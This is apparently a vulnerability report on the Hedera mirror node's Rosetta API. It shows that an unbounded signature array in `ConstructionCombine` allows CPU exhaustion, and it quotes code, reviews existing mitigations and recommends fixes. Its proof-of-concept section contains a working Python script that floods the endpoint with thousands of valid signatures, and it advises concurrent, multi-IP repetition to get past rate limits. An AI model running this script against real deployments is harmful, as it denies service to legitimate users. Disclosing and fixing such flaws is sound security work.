### Title
Unbounded Signature Array in `ConstructionCombine` Enables CPU Exhaustion via Repeated Cryptographic Operations

### Summary
`ConstructionCombine` in `rosetta/app/services/construction_service.go` iterates over an attacker-controlled `Signatures` array with no upper-bound check, calling `hiero.PublicKeyFromBytes()` and `ed25519.Verify()` for every entry. Because the attacker fully controls both the unsigned transaction and the key pairs used to sign it, they can supply arbitrarily many valid signatures in a single request, forcing the server to perform an unbounded number of expensive cryptographic operations. No application-level rate limiting or request-body size cap exists to prevent this.

### Finding Description

**Exact code path:**

`rosetta/app/services/construction_service.go`, function `ConstructionCombine`, lines 58–87.

```go
// line 58 – only lower-bound guard, no upper-bound guard
if len(request.Signatures) == 0 {
    return nil, errors.ErrNoSignature
}
// ...
for _, signature := range request.Signatures {   // line 72 – unbounded
    if signature.SignatureType != rTypes.Ed25519 {
        return nil, errors.ErrInvalidSignatureType
    }
    pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes) // line 77
    if err != nil {
        return nil, errors.ErrInvalidPublicKey
    }
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) { // line 82
        return nil, errors.ErrInvalidSignatureVerification
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
}
```

**Root cause / failed assumption:**

The code assumes callers supply a small, bounded number of signatures (matching the number of required signers for a Hiero transaction). There is no `maxSignatures` constant, no `len(request.Signatures) > N` guard, and no `http.MaxBytesReader` applied to the request body. The only guard (`len == 0`) is a lower-bound check.

**Why the loop runs to completion for an attacker:**

The loop exits early only on an *invalid* signature (line 82–84). An attacker who controls both `UnsignedTransaction` and the key material can trivially produce N *valid* (pubkey, signature) pairs:

1. Craft any syntactically valid frozen Hiero transaction hex string (the `UnsignedTransaction` field is fully attacker-supplied).
2. Extract `frozenBodyBytes` from it (or simply sign the known transaction body bytes).
3. Generate N ed25519 key pairs offline.
4. Sign `frozenBodyBytes` with each private key.
5. Populate `Signatures[0..N-1]` with the resulting valid (pubkey, sig) tuples.

Every entry passes the `ed25519.Verify` check, so the loop runs all N iterations.

**Existing checks reviewed and shown insufficient:**

| Check | Location | Sufficient? |
|---|---|---|
| `len(Signatures) == 0` | line 58 | No – only rejects empty array |
| Traefik `rateLimit: average: 10` / `inFlightReq: amount: 5` | `charts/hedera-mirror-rosetta/values.yaml` lines 152–160 | No – gated on `global.middleware: false` (default); not applied in bare deployments |
| HTTP `ReadTimeout: 5s` | `main.go` line 225 | Partial – limits bytes per request but still allows thousands of signatures at typical network speeds |
| No `http.MaxBytesReader` | `main.go` lines 220–227 | Absent – no body-size cap enforced at the Go HTTP layer | [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

### Impact Explanation

Each `ed25519.Verify` call is a real elliptic-curve operation. Sending a single request with, say, 50 000 valid signatures forces ~50 000 verify operations synchronously on the serving goroutine. With Go's default `net/http` concurrency model (one goroutine per connection), multiple concurrent connections from different source IPs multiply the effect linearly. Because the Traefik middleware is disabled by default, a bare deployment has no per-IP or per-host throttle. The result is sustained CPU saturation on the Rosetta node, degrading or denying service to legitimate users. The endpoint is available in both online and offline modes, widening the attack surface. [6](#0-5) [7](#0-6) [8](#0-7) 

### Likelihood Explanation

The attack requires no credentials, no on-chain funds, and no prior knowledge of the system beyond the public Rosetta API spec. Key-pair generation and signing are pure offline operations. The attacker needs only a single HTTP client capable of sending large JSON bodies. The endpoint is publicly reachable (ingress enabled by default, paths `/rosetta/construction` exposed). Repeatability is high: the attacker can pre-compute a library of valid (tx, signatures[]) payloads and replay them continuously. [9](#0-8) 

### Recommendation

1. **Add an upper-bound guard** immediately after the lower-bound check:
   ```go
   const maxSignaturesPerCombine = 25 // tune to actual max signers
   if len(request.Signatures) == 0 {
       return nil, errors.ErrNoSignature
   }
   if len(request.Signatures) > maxSignaturesPerCombine {
       return nil, errors.ErrTooManySignatures
   }
   ```
2. **Apply `http.MaxBytesReader`** in the HTTP handler or middleware to cap request body size (e.g., 64 KB).
3. **Enable the Traefik middleware by default** (`global.middleware: true`) or enforce equivalent rate limiting at the application layer so that bare deployments are protected.
4. **Consider moving signature-count validation into the Rosetta asserter layer** so it is enforced before the service method is reached. [10](#0-9) [11](#0-10) 

### Proof of Concept

```python
import json, subprocess, hashlib
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

# 1. Obtain a valid unsigned_transaction hex from /construction/payloads
#    (or craft one manually; the attacker controls this field entirely)
UNSIGNED_TX = "<hex from /construction/payloads>"
FROZEN_BODY_BYTES = bytes.fromhex("<frozenBodyBytes extracted from UNSIGNED_TX>")

N = 10_000  # number of signatures to send

signatures = []
for _ in range(N):
    priv = Ed25519PrivateKey.generate()
    pub  = priv.public_key()
    sig  = priv.sign(FROZEN_BODY_BYTES)
    pub_bytes = pub.public_bytes_raw()
    signatures.append({
        "signing_payload": {
            "account_identifier": {"address": "0.0.1"},
            "hex_bytes": FROZEN_BODY_BYTES.hex(),
            "signature_type": "ed25519"
        },
        "public_key": {"hex_bytes": pub_bytes.hex(), "curve_type": "edwards25519"},
        "signature_type": "ed25519",
        "hex_bytes": sig.hex()
    })

payload = json.dumps({
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "unsigned_transaction": UNSIGNED_TX,
    "signatures": signatures
})

# 2. Send to the target
import requests
r = requests.post("http://<target>:5700/construction/combine",
                  data=payload,
                  headers={"Content-Type": "application/json"})
print(r.status_code, r.text[:200])

# 3. Repeat with multiple concurrent threads/processes to saturate CPU
```

All N `ed25519.Verify` calls execute server-side before any response is returned. Repeating with concurrent connections from multiple IPs (bypassing per-IP Traefik limits even when enabled) drives CPU above the 30% baseline threshold.

### Citations

**File:** rosetta/app/services/construction_service.go (L58-60)
```go
	if len(request.Signatures) == 0 {
		return nil, errors.ErrNoSignature
	}
```

**File:** rosetta/app/services/construction_service.go (L72-87)
```go
	for _, signature := range request.Signatures {
		if signature.SignatureType != rTypes.Ed25519 {
			return nil, errors.ErrInvalidSignatureType
		}

		pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
		if err != nil {
			return nil, errors.ErrInvalidPublicKey
		}

		if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
			return nil, errors.ErrInvalidSignatureVerification
		}

		_, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
	}
```

**File:** rosetta/main.go (L111-119)
```go
	return server.NewRouter(
		networkAPIController,
		blockAPIController,
		mempoolAPIController,
		constructionAPIController,
		accountAPIController,
		healthController,
		metricsController,
	), nil
```

**File:** rosetta/main.go (L131-153)
```go
	baseService := services.NewOfflineBaseService()

	constructionAPIService, err := services.NewConstructionAPIService(
		nil,
		baseService,
		mirrorConfig,
		construction.NewTransactionConstructor(),
	)
	if err != nil {
		return nil, err
	}
	constructionAPIController := server.NewConstructionAPIController(constructionAPIService, asserter)
	healthController, err := middleware.NewHealthController(&mirrorConfig.Rosetta)
	if err != nil {
		return nil, err
	}

	metricsController := middleware.NewMetricsController()
	networkAPIService := services.NewNetworkAPIService(baseService, nil, network, version)
	networkAPIController := server.NewNetworkAPIController(networkAPIService, asserter)

	return server.NewRouter(constructionAPIController, healthController, metricsController, networkAPIController), nil
}
```

**File:** rosetta/main.go (L217-219)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L88-96)
```yaml
global:
  config: {}
  env: {}
  gateway:
    enabled: false
    hostnames: []
  image: {}
  middleware: false
  namespaceOverride: ""
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L119-136)
```yaml
ingress:
  annotations:
    traefik.ingress.kubernetes.io/router.middlewares: '{{ include "hedera-mirror-rosetta.namespace" . }}-{{ include "hedera-mirror-rosetta.fullname" . }}@kubernetescrd'
  enabled: true
  hosts:
    - host: ""
      paths:
        - "/rosetta/account"
        - "/rosetta/block"
        - "/rosetta/call"
        - "/rosetta/construction"
        - "/rosetta/events"
        - "/rosetta/mempool"
        - "/rosetta/network"
        - "/rosetta/search"
  tls:
    enabled: false
    secretName: ""
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
